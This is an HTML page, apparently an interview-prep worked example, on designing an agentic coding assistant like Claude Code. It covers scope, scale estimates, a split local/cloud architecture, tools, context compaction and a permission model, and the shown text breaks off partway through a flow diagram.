@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Design Claude Code — Worked Example</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=DM+Sans:ital,wght@0,400;0,500;0,600;0,700&family=Fraunces:ital,opsz,wght@0,9..144,700;1,9..144,400&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0e1117;--surface:#161b22;--surface-raised:#1c2129;--border:#2d333b;--border-light:#373e47;--text:#e6edf3;--text-muted:#8b949e;--text-dim:#6e7681;--accent-blue:#58a6ff;--accent-green:#3fb950;--accent-orange:#d29922;--accent-red:#f85149;--accent-purple:#bc8cff;--accent-cyan:#39d2c0;--accent-yellow:#e3b341;--phase1:#58a6ff;--phase2:#d29922;--phase3:#3fb950;--phase4:#f85149;--phase5:#bc8cff;--phase6:#39d2c0;--nav-width:270px;--font-body:'DM Sans',-apple-system,sans-serif;--font-mono:'JetBrains Mono',monospace;--font-display:'Fraunces',Georgia,serif}*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth;scroll-padding-top:24px}body{font-family:var(--font-body);background:var(--bg);color:var(--text);font-size:14px;line-height:1.6}
+nav{position:fixed;top:0;left:0;width:var(--nav-width);height:100vh;background:var(--surface);border-right:1px solid var(--border);padding:24px 0;overflow-y:auto;z-index:100;display:flex;flex-direction:column}nav .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px}nav .logo h1{font-family:var(--font-display);font-size:18px;font-weight:700;color:var(--text);letter-spacing:-0.02em;line-height:1.3}nav .logo span{display:block;font-family:var(--font-body);font-size:11px;color:var(--text-dim);margin-top:4px;text-transform:uppercase;letter-spacing:0.08em}.nav-section-label{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-dim);padding:12px 20px 6px}nav a{display:flex;align-items:center;gap:10px;padding:7px 20px;color:var(--text-muted);text-decoration:none;font-size:13px;font-weight:500;transition:all .15s;border-left:2px solid transparent}nav a:hover{color:var(--text);background:var(--surface-raised)}nav a.active{color:var(--text);border-left-color:var(--accent-blue);background:rgba(88,166,255,.06)}.nav-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}.nav-time{margin-left:auto;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);background:var(--surface-raised);padding:1px 6px;border-radius:3px}
+main{margin-left:var(--nav-width);padding:32px 48px 120px;max-width:960px}
+.phase{margin-bottom:40px;border:1px solid var(--border);border-radius:10px;overflow:hidden;background:var(--surface)}.phase-header{display:flex;align-items:center;gap:14px;padding:16px 20px;cursor:pointer;user-select:none;transition:background .15s}.phase-header:hover{background:var(--surface-raised)}.phase-number{font-family:var(--font-mono);font-size:11px;font-weight:600;padding:3px 8px;border-radius:4px;color:var(--bg);flex-shrink:0}.phase-title{font-family:var(--font-display);font-size:17px;font-weight:700;flex:1}.phase-time{font-family:var(--font-mono);font-size:12px;color:var(--text-muted);flex-shrink:0}.phase-chevron{width:20px;height:20px;color:var(--text-dim);transition:transform .25s ease;flex-shrink:0}.phase.collapsed .phase-chevron{transform:rotate(-90deg)}.phase.collapsed .phase-body{display:none}.phase-body{padding:0 20px 20px;border-top:1px solid var(--border)}
+.callout{margin:14px 0;padding:12px 16px;border-radius:0 6px 6px 0;font-size:13px;line-height:1.6}.callout.goal{background:rgba(88,166,255,.05);border-left:3px solid var(--accent-blue);color:var(--text-muted)}.callout.goal strong{color:var(--accent-blue)}.callout.say{background:rgba(63,185,80,.06);border-left:3px solid var(--accent-green);color:var(--text-muted)}.callout.say::before{content:'🗣️ '}.callout.tip{background:rgba(210,153,34,.06);border-left:3px solid var(--accent-orange);color:var(--text-muted)}.callout.tip::before{content:'💡 '}.callout.decision{background:rgba(248,81,73,.05);border-left:3px solid var(--accent-red);color:var(--text-muted)}.callout.decision::before{content:'⚖️ '}.callout code{background:rgba(255,255,255,.06);padding:1px 5px;border-radius:3px;font-family:var(--font-mono);font-size:12px}
+.sub{font-size:14px;font-weight:700;color:var(--accent-cyan);margin:20px 0 8px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+.items{list-style:none;margin:10px 0}.items li{position:relative;padding:5px 0 5px 22px;font-size:13.5px;line-height:1.55;color:var(--text-muted)}.items li::before{content:'→';position:absolute;left:2px;color:var(--text-dim);font-family:var(--font-mono);font-size:12px}.items li strong{color:var(--text);font-weight:600}
+table{width:100%;border-collapse:collapse;font-size:12.5px;margin:12px 0}thead th{text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--text-dim);padding:8px 10px;border-bottom:1px solid var(--border-light);font-weight:600}tbody td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top;line-height:1.5;color:var(--text-muted)}tbody tr:last-child td{border-bottom:none}tbody td:first-child{font-weight:600;color:var(--text);font-family:var(--font-mono);font-size:11.5px;white-space:nowrap}
+.est-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0}.est-card{padding:12px 14px;border:1px solid var(--border);border-radius:8px;background:var(--surface-raised)}.est-card .label{font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--text-dim);margin-bottom:4px}.est-card .value{font-family:var(--font-mono);font-size:18px;font-weight:600;color:var(--accent-yellow)}.est-card .detail{font-size:11.5px;color:var(--text-dim);margin-top:4px;line-height:1.4}
+.schema{background:var(--surface-raised);border:1px solid var(--border);border-radius:8px;padding:14px 16px;margin:12px 0;font-family:var(--font-mono);font-size:12px;line-height:1.7;color:var(--text-muted);overflow-x:auto;white-space:pre}.schema .table-name{color:var(--accent-cyan);font-weight:600}.schema .pk{color:var(--accent-yellow)}.schema .fk{color:var(--accent-purple)}.schema .type{color:var(--text-dim)}.schema .comment{color:var(--text-dim);font-style:italic}
+.flow-diagram{background:var(--surface-raised);border:1px solid var(--border);border-radius:8px;padding:20px;margin:14px 0;font-family:var(--font-mono);font-size:12px;line-height:2;color:var(--text-muted);overflow-x:auto;white-space:pre;text-align:center}.flow-diagram .highlight{color:var(--accent-cyan);font-weight:600}.flow-diagram .arrow{color:var(--text-dim)}.flow-diagram .label{color:var(--accent-orange);font-size:10px}
+.comp-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}.comp-card{padding:12px 14px;border:1px solid var(--border);border-radius:8px;background:var(--surface-raised)}.comp-card h4{font-size:13px;font-weight:600;color:var(--text);margin-bottom:6px;display:flex;align-items:center;gap:6px}.comp-card h4 .tag{font-family:var(--font-mono);font-size:9px;padding:2px 6px;border-radius:3px;font-weight:600}.comp-card ul{list-style:none;font-size:12px;color:var(--text-muted);line-height:1.55}.comp-card ul li::before{content:'• ';color:var(--text-dim)}
+.failure-row{display:flex;gap:8px;margin:6px 0;font-size:12.5px;align-items:flex-start}.failure-row .scenario{color:var(--accent-red);font-weight:600;min-width:210px;flex-shrink:0}.failure-row .mitigation{color:var(--text-muted)}
+@media(max-width:900px){nav{display:none}main{margin-left:0;padding:20px 16px 80px}.est-grid,.comp-grid{grid-template-columns:1fr}}@media print{nav{display:none}main{margin-left:0;max-width:100%}.phase.collapsed .phase-body{display:block}}
+
+/* SVG Diagram Styles */
+.svg-diagram{margin:14px 0;border:1px solid var(--border);border-radius:8px;background:var(--surface-raised);overflow:hidden;position:relative}
+.svg-diagram svg{display:block;width:100%;height:auto}
+.svg-diagram .dia-title{position:absolute;top:10px;right:14px;font-family:var(--font-mono);font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:var(--text-dim);opacity:.6}
+.svg-node{transition:filter .2s ease}.svg-node:hover{filter:brightness(1.25)}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.svg-diagram[data-anim] .svg-node{animation:fadeInUp .4s ease both}
+</style>
+</head>
+<body>
+<nav>
+  <div class="logo"><h1>Design Claude Code</h1><span>Agentic Coding Tool · 75 min</span></div>
+  <div class="nav-section-label">Interview Phases</div>
+  <a href="#p1"><span class="nav-dot" style="background:var(--phase1)"></span>Clarify & Scope<span class="nav-time">5-7m</span></a>
+  <a href="#p2"><span class="nav-dot" style="background:var(--phase2)"></span>Estimation<span class="nav-time">3-5m</span></a>
+  <a href="#p3"><span class="nav-dot" style="background:var(--phase3)"></span>High-Level Design<span class="nav-time">8-12m</span></a>
+  <a href="#p4"><span class="nav-dot" style="background:var(--phase4)"></span>Deep Dives<span class="nav-time">25-30m</span></a>
+  <a href="#p5"><span class="nav-dot" style="background:var(--phase5)"></span>Cross-Cutting<span class="nav-time">10-12m</span></a>
+  <a href="#p6"><span class="nav-dot" style="background:var(--phase6)"></span>Wrap-Up<span class="nav-time">3-5m</span></a>
+  <div class="nav-section-label">Deep Dives</div>
+  <a href="#dd-loop">Agent Loop & Tool Use</a>
+  <a href="#dd-context">Context Window Management</a>
+  <a href="#dd-safety">Permission & Safety Model</a>
+  <a href="#dd-multi">Multi-Surface & Sessions</a>
+  <a href="#p7"><span class="nav-dot" style="background:var(--accent-cyan)"></span>Interview Q&amp;A<span class="nav-time">Practice</span></a>
+</nav>
+<main>
+
+<!-- P1 -->
+<div class="phase" id="p1">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--phase1)">01</span>
+    <span class="phase-title">Clarify the Problem & Scope</span><span class="phase-time">5–7 min</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"/></svg>
+  </div>
+  <div class="phase-body">
+    <div class="callout say">"We're designing an agentic coding assistant like Claude Code — a tool that lives in a developer's terminal (and IDE), reads their entire codebase, takes natural-language instructions, then autonomously plans and executes multi-step coding tasks by reading files, editing code, running shell commands, and iterating on test results. This is NOT a chatbot — it's an autonomous agent with real filesystem access."</div>
+
+    <div class="sub">Questions I'd Ask</div>
+    <ul class="items">
+            <li><strong>What does success look like?</strong> <em>→ Task completion rate (user gives a coding task → code works correctly without manual fixes). Secondary: developer trust (never breaks the repo), velocity (faster than doing it manually). The tension: higher autonomy → higher completion rate but lower trust if something goes wrong. This shapes the permission model — we need to maximize autonomy WITHIN a trust boundary.</em></li>
+      <li><strong>Client surfaces?</strong> Terminal CLI only, or also IDE extension, web, desktop? <em>→ CLI primary. IDE (VS Code), web, and desktop as secondary surfaces, all backed by the same agent engine.</em></li>
+      <li><strong>What tools can the agent use?</strong> <em>→ File read/write, bash/shell execution, web search, and MCP (Model Context Protocol) servers for external integrations (GitHub, Jira, etc).</em></li>
+      <li><strong>Hosting model?</strong> Cloud-hosted agent? Or local client calling cloud LLM API? <em>→ Hybrid: the client runs locally (has direct filesystem access), but calls a cloud-hosted LLM API for inference. The "agent loop" runs client-side.</em></li>
+      <li><strong>Concurrency?</strong> Can the agent spawn sub-agents? <em>→ Yes — controlled parallelism for subtasks (e.g., "review 5 files simultaneously").</em></li>
+      <li><strong>Scale?</strong> <em>→ ~500K active developers, ~2M sessions/day, each session averaging ~50 LLM API calls.</em></li>
+    </ul>
+
+    <div class="sub">Agreed Scope</div>
+    <table>
+      <thead><tr><th>In Scope</th><th>Out of Scope</th></tr></thead>
+      <tbody>
+        <tr><td>Agent loop (plan → tool use → iterate)</td><td>LLM training / fine-tuning</td></tr>
+        <tr><td>Tool system (file I/O, bash, search)</td><td>Model inference infrastructure (treat as API)</td></tr>
+        <tr><td>Context window management</td><td>Billing / subscription management</td></tr>
+        <tr><td>Permission / safety model</td><td>IDE rendering engine</td></tr>
+        <tr><td>Session persistence & multi-surface</td><td>CI/CD pipeline internals</td></tr>
+        <tr><td>MCP server integration</td><td>Code completion / autocomplete (different product)</td></tr>
+        <tr><td>Sub-agent parallelism</td><td>Marketplace for plugins</td></tr>
+        <tr><td>CLAUDE.md configuration system</td><td></td></tr>
+      </tbody>
+    </table>
+
+    <div class="sub">Core Use Cases</div>
+    <ul class="items">
+      <li><strong>UC1:</strong> Developer says "refactor the auth module from callbacks to async/await" → agent reads files, plans changes, edits multiple files, runs tests, iterates until tests pass.</li>
+      <li><strong>UC2:</strong> Developer says "fix the bug in issue #342" → agent reads the GitHub issue (via MCP), searches codebase for relevant code, makes the fix, writes a test, commits.</li>
+      <li><strong>UC3:</strong> Developer gives real-time steering mid-task — "actually, don't change the database layer" → agent adjusts plan without restarting.</li>
+      <li><strong>UC4:</strong> Developer starts a task in terminal, moves to VS Code to see diffs, then continues on desktop app.</li>
+    </ul>
+
+    <div class="sub">Non-Functional Requirements</div>
+    <ul class="items">
+      <li><strong>Streaming latency</strong> — first token must appear within 1-2 seconds. User watches the agent think in real-time.</li>
+      <li><strong>Tool execution must be fast</strong> — file reads and bash commands run locally (no network round-trip for filesystem).</li>
+      <li><strong>Safety is non-negotiable</strong> — the agent can execute arbitrary bash commands. Must never run destructive commands without explicit user approval.</li>
+      <li><strong>Context fidelity</strong> — the agent must maintain coherent understanding of the codebase across a long session (potentially hundreds of tool calls), even as the context window fills.</li>
+      <li><strong>Resumability</strong> — sessions must survive terminal crashes and be transferable between surfaces.</li>
+    </ul>
+
+    <div class="callout tip">This system is fundamentally different from Uber/Facebook/Amazon. Those were request-response at scale. This is a LONG-RUNNING STATEFUL AGENT with real-world side effects (file writes, shell commands). The defining tension: giving the agent enough autonomy to be useful, while keeping the human in control of dangerous operations.</div>
+  </div>
+</div>
+
+<!-- P2 -->
+<div class="phase" id="p2">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--phase2);color:var(--bg)">02</span>
+    <span class="phase-title">Back-of-the-Envelope Estimation</span><span class="phase-time">3–5 min</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"/></svg>
+  </div>
+  <div class="phase-body">
+    <div class="est-grid">
+      <div class="est-card"><div class="label">Active Developers</div><div class="value">~500K</div><div class="detail">Concurrent sessions at peak: ~100K</div></div>
+      <div class="est-card"><div class="label">Sessions / Day</div><div class="value">~2M</div><div class="detail">Avg session: ~15 min, ~50 LLM calls</div></div>
+      <div class="est-card"><div class="label">LLM API Calls / Day</div><div class="value">~100M</div><div class="detail">2M sessions × 50 calls. ~1.2K calls/sec avg, ~5K/sec peak.</div></div>
+      <div class="est-card"><div class="label">Tokens / Day</div><div class="value">~50B</div><div class="detail">Avg ~500K tokens/session (large context windows). Dominated by input tokens (codebase context).</div></div>
+      <div class="est-card"><div class="label">Tool Executions / Day</div><div class="value">~80M</div><div class="detail">~40 tool calls/session. File reads dominate (~60%), then bash (~25%), then edits (~15%).</div></div>
+      <div class="est-card"><div class="label">Session State</div><div class="value">~5 MB avg</div><div class="detail">Message history + tool results. 100K concurrent × 5MB = ~500GB active state.</div></div>
+    </div>
+
+    <div class="callout decision"><strong>Key insight #1:</strong> The bottleneck is NOT traditional web-scale throughput. It's LLM inference cost and latency. Each API call can take 5-30 seconds and costs $0.01-0.50 in tokens. The system design is dominated by context management (minimizing tokens) and tool execution orchestration (minimizing round-trips).</div>
+
+    <div class="callout decision"><strong>Key insight #2:</strong> The agent loop runs CLIENT-SIDE (on the developer's machine). This means filesystem operations are local (fast) and we don't need to host compute for tool execution. The cloud serves only the LLM API, session storage, and coordination.</div>
+
+    <div class="callout decision"><strong>Key insight #3:</strong> 500GB of active session state needs persistence for crash recovery and multi-surface handoff. But it's ephemeral — sessions expire after hours/days, not stored forever.</div>
+  </div>
+</div>
+
+<!-- P3 -->
+<div class="phase" id="p3">
+  <div class="phase-header" onclick="this.closest('.phase').classList.toggle('collapsed')">
+    <span class="phase-number" style="background:var(--phase3);color:var(--bg)">03</span>
+    <span class="phase-title">High-Level Design</span><span class="phase-time">8–12 min</span>
+    <svg class="phase-chevron" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"/></svg>
+  </div>
+  <div class="phase-body">
+    <div class="callout say">"The key architectural insight is that this is a SPLIT ARCHITECTURE — the agent loop and tool execution run locally on the developer's machine, while inference and session persistence live in the cloud. Let me draw both sides."</div>
+
+    
+    <div class="sub">Key Architecture Decisions</div>
+    <div class="callout say">"Here's WHY I chose each technology — mapping requirements to tradeoffs. Every choice has a rejected alternative and a consequence."</div>
+    <table>
+      <thead><tr><th style="width:22%">Requirement</th><th style="width:20%">Decision</th><th style="width:42%">Why (and what was rejected)</th><th style="width:16%">Consistency</th></tr></thead>
+      <tbody>
+      <tr><td>Streaming first-token latency &lt;2 seconds</td><td style="color:var(--accent-cyan);font-weight:500">Direct API streaming (no queue/batch)</td><td>User watches agent think in real-time. Queueing would add seconds of latency. Streaming HTTP/SSE from Claude API.</td><td>—</td></tr>
+      <tr><td>Tool execution: bash, file edit, search</td><td style="color:var(--accent-cyan);font-weight:500">Local execution on developer's machine (not cloud sandbox)</td><td>Zero network latency for filesystem operations. Full access to project files, git, local tools. Cloud sandbox would add 100ms+ per tool call.</td><td>—</td></tr>
+      <tr><td>Context window is a hard 200K token limit</td><td style="color:var(--accent-cyan);font-weight:500">Compaction strategy (summarize old turns)</td><td>When approaching limit, compress tool outputs into summaries. Preserves key decisions and state. Alternative: truncate (loses critical context).</td><td>—</td></tr>
+      <tr><td>Safety: prevent dangerous commands</td><td style="color:var(--accent-cyan);font-weight:500">Multi-layered: classification + permission + sandbox</td><td>Risk-tier classification of bash commands. Dangerous operations require human approval. No single layer is foolproof — defense in depth.</td><td>—</td></tr>
+      <tr><td>No persistent state between sessions</td><td style="color:var(--accent-cyan);font-weight:500">Filesystem IS the state (git repo)</td><td>The project's files and git history are the durable state. No database needed. CLAUDE.md for project preferences persists across sessions.</td><td>—</td></tr>
+      </tbody>
+    </table>
+
+    <div class="sub">Major Components</div>
+    <div class="svg-diagram" data-anim>
+  <span class="dia-title">High-Level Architecture</span>
+  <svg viewBox="0 0 780 356" xmlns="http://www.w3.org/2000/svg" style="font-family:'DM Sans',sans-serif">
+    <defs>
+      <marker id="topo_5030" markerWidth="7" markerHeight="5" refX="7" refY="2.5" orient="auto"><path d="M0,0 L7,2.5 L0,5" fill="none" stroke="#6e7681" stroke-width="1"/></marker>
+      <marker id="topo_5030h" markerWidth="7" markerHeight="5" refX="7" refY="2.5" orient="auto"><path d="M0,0 L7,2.5 L0,5" fill="none" stroke="#39d2c0" stroke-width="1"/></marker>
+    </defs>
+    <rect x="28" y="28" width="724" height="84" rx="8" fill="rgba(88,166,255,.02)" stroke="rgba(88,166,255,.12)" stroke-dasharray="4 2"/>
+    <text x="40" y="41" fill="#58a6ff" font-size="8" font-weight="600" letter-spacing=".1em" opacity=".7">CLIENTS</text>
+    <rect x="28" y="128" width="724" height="84" rx="8" fill="rgba(57,210,192,.02)" stroke="rgba(57,210,192,.12)" stroke-dasharray="4 2"/>
+    <text x="40" y="141" fill="#39d2c0" font-size="8" font-weight="600" letter-spacing=".1em" opacity=".7">LOCAL AGENT (developer machine)</text>
+    <rect x="28" y="228" width="724" height="84" rx="8" fill="rgba(247,120,186,.02)" stroke="rgba(247,120,186,.12)" stroke-dasharray="4 2"/>
+    <text x="40" y="241" fill="#f778ba" font-size="8" font-weight="600" letter-spacing=".1em" opacity=".7">EXTERNAL</text>
+    <line x1="390" y1="94" x2="219" y2="154" stroke="#6e7681" stroke-width="1" marker-end="url(#topo_5030)" opacity=".5"/>
+    <line x1="219" y1="154" x2="333" y2="194" stroke="#6e7681" stroke-width="1" marker-end="url(#topo_5030)" opacity=".5"/>
+    <line x1="333" y1="194" x2="328" y2="254" stroke="#6e7681" stroke-width="1.2" marker-end="url(#topo_5030)" opacity=".6"/>
+    <text x="341" y="224" fill="#6e7681" font-size="7" font-family="'JetBrains Mono',monospace" opacity=".7">prompt</text>
+    <line x1="333" y1="154" x2="447" y2="194" stroke="#6e7681" stroke-width="1" marker-end="url(#topo_5030)" opacity=".5"/>
+    <line x1="447" y1="194" x2="452" y2="254" stroke="#6e7681" stroke-width="1.2" marker-end="url(#topo_5030)" opacity=".6"/>
+    <line x1="561" y1="154" x2="333" y2="194" stroke="#6e7681" stroke-width="1" marker-end="url(#topo_5030)" opacity=".5"/>
+    <rect class="svg-node" x="340" y="54" width="100" height="40" rx="6" fill="rgba(88,166,255,.06)" stroke="rgba(88,166,255,.3)"/>
+    <text x="390" y="71" fill="#58a6ff" font-size="10" font-weight="600" text-anchor="middle">👩‍💻 Developer</text>
+    <text x="390" y="84" fill="#6e7681" font-size="8" text-anchor="middle">terminal · IDE</text>
+    <rect class="svg-node" x="169" y="154" width="100" height="40" rx="6" fill="rgba(57,210,192,.06)" stroke="rgba(57,210,192,.3)"/>
+    <text x="219" y="171" fill="#39d2c0" font-size="10" font-weight="600" text-anchor="middle">⌨️ CLI Interface</text>
+    <text x="219" y="184" fill="#6e7681" font-size="8" text-anchor="middle">REPL · slash commands</text>
+    <rect class="svg-node" x="283" y="154" width="100" height="40" rx="6" fill="rgba(57,210,192,.06)" stroke="rgba(57,210,192,.3)"/>
+    <text x="333" y="171" fill="#39d2c0" font-size="10" font-weight="600" text-anchor="middle">🤖 Agent Loop</text>
+    <text x="333" y="184" fill="#6e7681" font-size="8" text-anchor="middle">tool → LLM → tool cycle</text>
+    <rect class="svg-node" x="397" y="154" width="100" height="40" rx="6" fill="rgba(57,210,192,.06)" stroke="rgba(57,210,192,.3)"/>
+    <text x="447" y="171" fill="#39d2c0" font-size="10" font-weight="600" text-anchor="middle">🔧 Tool Executor</text>
+    <text x="447" y="184" fill="#6e7681" font-size="8" text-anchor="middle">bash · edit · search</text>
+    <rect class="svg-node" x="511" y="154" width="100" height="40" rx="6" fill="rgba(57,210,192,.06)" stroke="rgba(57,210,192,.3)"/>
+    <text x="561" y="171" fill="#39d2c0" font-size="10" font-weight="600" text-anchor="middle">📋 Context Manager</text>
+    <text x="561" y="184" fill="#6e7681" font-size="8" text-anchor="middle">compaction · 200K window</text>
+    <rect class="svg-node" x="273" y="254" width="110" height="40" rx="6" fill="rgba(247,120,186,.06)" stroke="rgba(247,120,186,.3)"/>
+    <text x="328" y="271" fill="#f778ba" font-size="10" font-weight="600" text-anchor="middle">🧠 Claude API</text>
+    <text x="328" y="284" fill="#6e7681" font-size="8" text-anchor="middle">Anthropic · streaming</text>
+    <rect class="svg-node" x="397" y="254" width="110" height="40" rx="6" fill="rgba(247,120,186,.06)" stroke="rgba(247,120,186,.3)"/>
+    <text x="452" y="271" fill="#f778ba" font-size="10" font-weight="600" text-anchor="middle">📁 Local Filesystem</text>
+    <text x="452" y="284" fill="#6e7681" font-size="8" text-anchor="middle">git repo · project files</text>
+  </svg>
+</div>
+
+    <div class="comp-grid">
+      <div class="comp-card">
+        <h4>🖥️ Client Agent Runtime <span class="tag" style="background:rgba(63,185,80,.15);color:var(--accent-green)">LOCAL</span></h4>
+        <ul>
+          <li>Master agent loop (the "brain")</li>
+          <li>Tool executor (file I/O, bash, search)</li>
+          <li>CLAUDE.md loader & config parser</li>
+          <li>Permission system (confirm/deny prompts)</li>
+          <li>Streaming UI renderer</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>🧠 LLM Inference API <span class="tag" style="background:rgba(248,81,73,.15);color:var(--accent-red)">CLOUD</span></h4>
+        <ul>
+          <li>Messages API with streaming</li>
+          <li>Tool definitions & tool_use responses</li>
+          <li>Model routing (Opus/Sonnet based on task)</li>
+          <li>Rate limiting & quota management</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>🔧 Tool System <span class="tag" style="background:rgba(57,210,192,.15);color:var(--accent-cyan)">LOCAL</span></h4>
+        <ul>
+          <li>FileRead, FileWrite, FileEdit (str_replace)</li>
+          <li>Bash (persistent shell sessions)</li>
+          <li>Search (grep, ripgrep, ast-grep)</li>
+          <li>TodoWrite (structured task tracking)</li>
+          <li>MCP client → external MCP servers</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>📋 Session Service <span class="tag" style="background:rgba(188,140,255,.15);color:var(--accent-purple)">CLOUD</span></h4>
+        <ul>
+          <li>Persist conversation history</li>
+          <li>Enable multi-surface handoff</li>
+          <li>Crash recovery (resume from last state)</li>
+          <li>Session TTL & cleanup</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>🛡️ Permission Engine <span class="tag" style="background:rgba(248,81,73,.15);color:var(--accent-red)">LOCAL</span></h4>
+        <ul>
+          <li>Risk classification per tool invocation</li>
+          <li>Auto-approve safe ops (file read)</li>
+          <li>Prompt for dangerous ops (rm, git push)</li>
+          <li>Block disallowed operations</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>🔌 MCP Gateway <span class="tag" style="background:rgba(210,153,34,.15);color:var(--accent-orange)">LOCAL+REMOTE</span></h4>
+        <ul>
+          <li>MCP client connects to user-configured servers</li>
+          <li>GitHub, Jira, Slack, Google Drive, etc.</li>
+          <li>Tools dynamically registered from MCP</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>🌿 Sub-Agent System <span class="tag" style="background:rgba(227,179,65,.15);color:var(--accent-yellow)">LOCAL</span></h4>
+        <ul>
+          <li>Spawn parallel agents for subtasks</li>
+          <li>Each sub-agent: own context, own tool access</li>
+          <li>Lead agent coordinates & merges results</li>
+        </ul>
+      </div>
+      <div class="comp-card">
+        <h4>📄 CLAUDE.md System <span class="tag" style="background:rgba(88,166,255,.15);color:var(--accent-blue)">LOCAL</span></h4>
+        <ul>
+          <li>Project-root config file</li>
+          <li>Coding standards, architecture notes</li>
+          <li>Injected into system prompt every session</li>
+          <li>Hierarchical: project → directory → user global</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="sub">Flow 1: Developer Gives an Instruction</div>
+<div class="svg-diagram" data-anim>
+  <span class="dia-title">Questions I'd Ask</span>
+  <svg viewBox="0 0 560 852" xmlns="http://www.w3.org/2000/svg" style="font-family:'DM Sans',sans-serif">
+    <defs><marker id="a1329" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="none" stroke="#6e7681" stroke-width="1.2"/></marker></defs>
+    <rect class="svg-node" x="127" y="40" width="307" height="44" rx="7" fill="rgba(248,81,73,.06)" stroke="rgba(248,81,73,.3)"/>
+    <text x="280" y="58" fill="#f85149" font-size="12" font-weight="600" text-anchor="middle">Developer</text>
+    <text x="280" y="74" fill="#6e7681" font-size="9" text-anchor="middle">: "refactor auth module to async/await"</text>
+    <line x1="280" y1="84" x2="280" y2="170" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
+    <text x="296" y="100" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">1. Load CLAUDE.md → inject into system prompt</text>
+    <text x="296" y="116" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">2. Assemble context: user message + conversation history</text>
+    <text x="296" y="132" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">3. Send to LLM API (streaming)</text>
+    <rect class="svg-node" x="110" y="172" width="340" height="44" rx="7" fill="rgba(57,210,192,.06)" stroke="rgba(57,210,192,.3)"/>
+    <text x="280" y="200" fill="#39d2c0" font-size="12" font-weight="600" text-anchor="middle">Client Agent Runtime</text>
+    <line x1="280" y1="216" x2="280" y2="254" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
+    <rect class="svg-node" x="130" y="256" width="301" height="44" rx="7" fill="rgba(88,166,255,.06)" stroke="rgba(88,166,255,.3)"/>
+    <text x="280" y="284" fill="#58a6ff" font-size="12" font-weight="600" text-anchor="middle">LLM API</text>
+    <line x1="280" y1="300" x2="280" y2="370" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
+    <text x="296" y="316" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">Response includes tool_use blocks:</text>
+    <text x="296" y="332" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">tool_use: FileRead("src/auth/handler.ts")</text>
+    <rect class="svg-node" x="131" y="372" width="298" height="44" rx="7" fill="rgba(210,153,34,.06)" stroke="rgba(210,153,34,.3)"/>
+    <text x="280" y="400" fill="#d29922" font-size="12" font-weight="600" text-anchor="middle">Client</text>
+    <line x1="280" y1="416" x2="280" y2="502" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
+    <text x="296" y="432" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">Execute FileRead → return file contents</text>
+    <text x="296" y="448" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">Append tool_result to conversation</text>
+    <text x="296" y="464" fill="#d29922" font-size="9" font-family="'JetBrains Mono',monospace">Send updated conversation to LLM API</text>
+    <rect class="svg-node" x="121" y="504" width="319" height="44" rx="7" fill="rgba(63,185,80,.06)" stroke="rgba(63,185,80,.3)"/>
+    <text x="280" y="522" fill="#3fb950" font-size="12" font-weight="600" text-anchor="middle">Tool Executor</text>
+    <text x="280" y="538" fill="#6e7681" font-size="9" text-anchor="middle">local</text>
+    <line x1="280" y1="548" x2="280" y2="586" stroke="#6e7681" stroke-width="1.3" marker-end="url(#a1329)"/>
